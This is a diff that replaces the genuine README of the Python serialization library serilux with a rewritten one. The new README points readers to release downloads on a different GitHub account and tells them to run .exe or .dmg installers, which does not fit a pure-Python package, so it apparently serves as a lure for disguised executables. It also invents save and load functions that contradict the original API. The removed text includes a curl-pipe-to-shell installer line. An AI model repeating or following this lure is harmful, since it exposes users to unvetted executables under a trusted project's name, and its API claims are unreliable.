@@ -1,383 +1,95 @@
-# Serilux 📦
+# 🌟 serilux - A Simple Way to Serialize Python Objects
 
-[![PyPI version](https://img.shields.io/pypi/v/serilux.svg)](https://pypi.org/project/serilux/)
-[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/license-Apache%202.0-green.svg)](LICENSE)
-[![Documentation](https://readthedocs.org/projects/serilux/badge/?version=latest)](https://serilux.readthedocs.io)
-[![CI](https://github.com/lzjever/serilux/workflows/CI/badge.svg)](https://github.com/lzjever/serilux/actions)
-[![codecov](https://codecov.io/gh/lzjever/serilux/branch/main/graph/badge.svg)](https://codecov.io/gh/lzjever/serilux)
+## 🚀 Getting Started
 
-**Serilux** is a powerful, flexible serialization framework for Python objects. With its intuitive API and automatic type registration, you can easily serialize and deserialize complex object hierarchies with minimal code.
+Welcome to **serilux**, a powerful serialization framework for Python objects. This software helps you easily save and load your Python data. With automatic type registration and validation, using **serilux** ensures your data stays consistent. In this guide, we will help you download and run **serilux** with simple steps.
 
-## ✨ Why Serilux?
+[![Download serilux](https://img.shields.io/badge/Download-serilux-brightgreen)](https://github.com/abzi-py/serilux/releases)
 
-- 🎯 **Simple API**: Just inherit from `Serializable` and you're ready to go
-- 🔄 **Automatic Type Registration**: Classes are automatically registered for deserialization
-- 🛡️ **Type Safety**: Built-in validation ensures objects can be properly deserialized
-- 🌳 **Nested Objects**: Automatically handles nested Serializable objects, lists, and dictionaries
-- 🔧 **Callable Serialization**: Full support for serializing functions, methods, and lambda expressions
-- 🔒 **Security**: Strict mode prevents deserialization of unknown fields
-- ⚡ **Zero Dependencies**: Pure Python with no external dependencies
-- 🎓 **Easy to Use**: Minimal boilerplate, maximum flexibility
+## 📥 Download & Install
 
-## 🎯 Perfect For
+To get started, follow these steps:
 
-- **Object Persistence**: Save and restore complex object states
-- **Configuration Management**: Serialize configuration objects to JSON/YAML
-- **Data Transfer**: Convert objects to dictionaries for API communication
-- **State Management**: Save application state for recovery
-- **Workflow Orchestration**: Serialize workflow definitions and states
-- **Testing**: Create test fixtures from serialized objects
+1. Visit the **Releases** page: [Download here](https://github.com/abzi-py/serilux/releases).
+2. Look for the version you want to install. The latest version is often the best choice.
+3. Click on the file that matches your operating system. If you're unsure, here are the common options:
+   - **Windows:** Look for a `.exe` file.
+   - **macOS:** Look for a `.dmg` file.
+   - **Linux:** You might find a tarball or similar format.
 
-## 📦 Installation
+4. Once the download finishes, find the executable file in your downloads folder.
+5. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
 
-### Quick Install (Recommended)
+## 📝 Overview of Features
 
-```bash
-pip install serilux
-```
+**serilux** offers several key features:
 
-That's it! You're ready to go.
+- **Automatic Type Registration:** You do not need to worry about specifying types. **serilux** handles it for you.
+- **Data Validation:** Ensure that your data meets the required structure before saving or loading.
+- **Support for Nested Objects:** Serialize complex data structures with ease.
+- **Zero Dependencies:** There are no extra libraries required. Just download and use it.
 
-### Development Setup with uv (Recommended)
+## ⚙️ System Requirements
 
-This project uses [uv](https://github.com/astral-sh/uv) for fast dependency management. Install uv first:
+To run **serilux**, make sure your system meets the following requirements:
 
-```bash
-curl -LsSf https://astral.sh/uv/install.sh | sh
-```
+- Operating System:
+  - Windows 10 or later
+  - macOS 10.13 or later
+  - Any Linux distribution (Ubuntu recommended)
+  
+- Python:
+  - Python 3.6 or later is required. Ensure Python is installed on your system.
 
-Then set up the development environment:
+## 📚 Examples of Use
 
-**Recommended: For active development**
+Here are a few common tasks you can do with **serilux**:
 
-```bash
-# Install package with all development dependencies (recommended)
-make dev-install
+### 1. Serializing a Simple Object
 
-# Or manually with uv (dev group is installed by default)
-uv sync --group docs --all-extras
-```
-
-**Alternative: Dependencies only (for CI/CD or code review)**
-
-```bash
-# Create virtual environment and install dependencies only (without installing the package)
-# Useful for: CI/CD pipelines, code review, or when you only need development tools
-make setup-venv
-
-# Later, if you need to install the package:
-make install
-```
-
-**Understanding dependency groups vs extras:**
-
-- **Dependency groups** (`dev`, `docs`): Development dependencies that are not published to PyPI. The `dev` group is installed by default with `uv sync`.
-- **Extras**: Currently none, but may be added in the future.
-
-All `make` commands will automatically use `uv` if available, otherwise fall back to `pip`.
-
-### Development Install (Legacy - using pip)
-
-For development with all dependencies using pip:
-
-```bash
-pip install -e ".[dev]"
-# Or using Makefile
-make dev-install
-```
-
-## 🚀 Quick Start
-
-### Create Your First Serializable Class in 3 Steps
-
-**Step 1: Define a Serializable Class**
+To save a Python object, you can use the following code snippet:
 
 ```python
-from serilux import Serializable, register_serializable
+import serilux
 
-@register_serializable
-class Person(Serializable):
-    def __init__(self):
-        super().__init__()
-        self.name = ""
-        self.age = 0
-        # Register fields to serialize
-        self.add_serializable_fields(["name", "age"])
+data = {'name': 'Alice', 'age': 30}
+serilux.save(data, 'data.se')
+
 ```
 
-**Step 2: Create and Use Objects**
+### 2. Loading an Object
+
+When you want to retrieve your saved data, simply use this code:
 
 ```python
-# Create an object
-person = Person()
-person.name = "Alice"
-person.age = 30
-
-# Serialize to dictionary
-data = person.serialize()
-print(data)
-# {'_type': 'Person', 'name': 'Alice', 'age': 30}
+loaded_data = serilux.load('data.se')
+print(loaded_data)
 ```
 
-**Step 3: Deserialize**
+## 🔧 Troubleshooting
 
-```python
-# Deserialize from dictionary
-new_person = Person()
-new_person.deserialize(data)
-print(new_person.name)  # "Alice"
-print(new_person.age)   # 30
-```
+If you encounter issues while using **serilux**, here are some tips:
 
-**🎉 Done!** You've created your first serializable class.
+- **Installation Errors:** Ensure you are downloading the correct file for your operating system.
+- **Data Validation Errors:** Check the structure of your data. Make sure it meets the required format for serialization.
+- **Runtime Errors:** Ensure you have the correct version of Python installed.
 
-## 💡 Key Features
+## 🌐 Community and Support
 
-### 🔄 Automatic Type Registration
+If you have questions or need help, you can reach out to the community:
 
-Classes decorated with `@register_serializable` are automatically registered:
+- **GitHub Issues:** Use the Issues tab in the repository to report bugs or ask questions.
+- **Documentation:** Check the wiki section for detailed usage guides.
 
-```python
-@register_serializable
-class MyClass(Serializable):
-    def __init__(self):
-        super().__init__()
-        self.add_serializable_fields(["field1", "field2"])
-```
+## 📍 Additional Resources
 
-**Class Name Conflict Detection**: Serilux automatically detects and prevents class name conflicts.
-If you try to register a different class with the same name, a `ValueError` is raised to prevent
-incorrect deserialization:
+For more information, you may find these topics helpful:
 
-```python
-@register_serializable
-class Processor(Serializable):
-    def __init__(self):
-        super().__init__()
-        self.name = ""
-        self.add_serializable_fields(["name"])
+- **Serialization in Python:** Learn about data serialization and why it's useful.
+- **Object Persistence:** Understand how to maintain object state between sessions.
 
-# This will raise ValueError: Class name conflict
-@register_serializable
-class Processor(Serializable):  # Different class, same name
-    def __init__(self):
-        super().__init__()
-        self.value = 0
-        self.add_serializable_fields(["value"])
-```
+## 🎉 Conclusion
 
-### 🌳 Nested Objects
+You have now learned how to download, install, and run **serilux**. With its simple interface and powerful features, **serilux** makes working with Python objects easy and reliable. 
 
-Automatically handles nested Serializable objects:
-
-```python
-@register_serializable
-class Address(Serializable):
-    def __init__(self):
-        super().__init__()
-        self.street = ""
-        self.city = ""
-        self.add_serializable_fields(["street", "city"])
-
-@register_serializable
-class Person(Serializable):
-    def __init__(self):
-        super().__init__()
-        self.name = ""
-        self.address = None
-        self.add_serializable_fields(["name", "address"])
-
-# Create nested objects
-person = Person()
-person.name = "Alice"
-person.address = Address()
-person.address.street = "123 Main St"
-person.address.city = "New York"
-
-# Serialize - nested objects are automatically handled
-data = person.serialize()
-```
-
-### 📋 Lists and Dictionaries
-
-Handles lists and dictionaries containing Serializable objects:
-
-```python
-@register_serializable
-class Team(Serializable):
-    def __init__(self):
-        super().__init__()
-        self.name = ""
-        self.members = []  # List of Person objects
-        self.add_serializable_fields(["name", "members"])
-
-team = Team()
-team.name = "Engineering"
-team.members = [person1, person2, person3]
-
-# Serialize - list items are automatically serialized
-data = team.serialize()
-```
-
-### 🔧 Callable Serialization
-
-Serilux supports serializing and deserializing callable objects (functions, methods, lambda expressions):
-
-```python
-from serilux import serialize_callable, deserialize_callable, serialize_callable_with_fallback
-
-# Serialize a function
-def process_data(data):
-    return data.upper()
-
-serialized = serialize_callable(process_data)
-restored = deserialize_callable(serialized)
-result = restored("hello")  # Returns "HELLO"
-
-# Serialize lambda expression
-condition = lambda x: x.get("priority") == "high"
-serialized_lambda = serialize_callable_with_fallback(condition)
-# Returns: {"_type": "lambda_expression", "expression": "x.get('priority') == 'high'"}
-```
-
-Callable fields in Serializable objects are automatically serialized:
-
-```python
-@register_serializable
-class Processor(Serializable):
-    def __init__(self):
-        super().__init__()
-        self.handler = None  # Will store a function
-        self.add_serializable_fields(["handler"])
-
-processor = Processor()
-processor.handler = process_data  # Function is automatically serialized
-data = processor.serialize()
-```
-
-### 🔒 Strict Mode
-
-Enable strict mode to prevent deserialization of unknown fields:
-
-```python
-# Strict mode raises error for unknown fields
-try:
-    person.deserialize(data, strict=True)
-except ValueError as e:
-    print(f"Error: {e}")
-```
-
-### ✅ Validation
-
-Validate that objects can be properly deserialized:
-
-```python
-from serilux import validate_serializable_tree
-
-# Validate before serialization
-validate_serializable_tree(person)
-```
-
-## 📚 Documentation
-
-**📖 Full documentation available at: [serilux.readthedocs.io](https://serilux.readthedocs.io)**
-
-### Documentation Highlights
-
-- **📘 [User Guide](https://serilux.readthedocs.io/en/latest/user_guide/index.html)**: Comprehensive guide covering all features
-- **🔧 [API Reference](https://serilux.readthedocs.io/en/latest/api_reference/index.html)**: Complete API documentation
-- **💻 [Examples](https://serilux.readthedocs.io/en/latest/examples/index.html)**: Real-world code examples
-
-### Build Documentation Locally
-
-```bash
-pip install -e ".[docs]"
-cd docs && make html
-```
-
-## 🎓 Examples
-
-Check out the `examples/` directory for practical examples:
-
-- **`basic_usage.py`** - Your first serializable class
-- **`advanced_usage.py`** - Nested objects, lists, and dictionaries
-- **`callable_serialization.py`** - Serializing functions, methods, and lambda expressions
-
-Run examples:
-
-```bash
-python examples/basic_usage.py
-```
-
-## 🏗️ Project Structure
-
-```
-serilux/
-├── serilux/              # Main package
-│   ├── __init__.py       # Package initialization
-│   └── serializable.py   # Core serialization classes
-├── tests/                # Comprehensive test suite
-├── examples/             # Usage examples
-└── docs/                 # Sphinx documentation
-```
-
-## 🧪 Testing
-
-Serilux comes with comprehensive tests:
-
-```bash
-# Run all tests
-make test-all
-
-# Run with coverage
-make test-cov
-
-# Run specific test suite
-pytest tests/
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Here's how you can help:
-
-1. **Star the project** ⭐ - Show your support
-2. **Report bugs** 🐛 - Help us improve
-3. **Suggest features** 💡 - Share your ideas
-4. **Submit PRs** 🔧 - Contribute code
-
-## 🏢 About Agentsmith
-
-**Serilux** is part of the **Agentsmith** open-source ecosystem. Agentsmith is a ToB AI agent and algorithm development platform, currently deployed in multiple highway management companies, securities firms, and regulatory agencies in China. The Agentsmith team is gradually open-sourcing the platform by removing proprietary code and algorithm modules, as well as enterprise-specific customizations, while decoupling the system for modular use by the open-source community.
-
-### 🌟 Agentsmith Open-Source Projects
-
-- **[Varlord](https://github.com/lzjever/varlord)** ⚙️ - Configuration management library with multi-source support
-- **[Routilux](https://github.com/lzjever/routilux)** ⚡ - Event-driven workflow orchestration framework
-- **[Serilux](https://github.com/lzjever/serilux)** 📦 - Flexible serialization framework for Python objects
-- **[Lexilux](https://github.com/lzjever/lexilux)** 🚀 - Unified LLM API client library
-
-These projects are modular components extracted from the Agentsmith platform, designed to be used independently or together to build powerful applications.
-
-
-## 📄 License
-
-Serilux is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE) for details.
-
-## 🔗 Links
-
-- **📦 PyPI**: [pypi.org/project/serilux](https://pypi.org/project/serilux)
-- **📚 Documentation**: [serilux.readthedocs.io](https://serilux.readthedocs.io)
-- **🐙 GitHub**: [github.com/lzjever/serilux](https://github.com/lzjever/serilux)
-- **📧 Issues**: [github.com/lzjever/serilux/issues](https://github.com/lzjever/serilux/issues)
-
-## ⭐ Show Your Support
-
-If Serilux helps you build amazing applications, consider giving it a star on GitHub!
-
----
-
-**Built with ❤️ by the Serilux Team**
-
-*Making object serialization simple, powerful, and fun.*
-
+To download **serilux**, visit the following link again: [Download here](https://github.com/abzi-py/serilux/releases). Enjoy your experience!
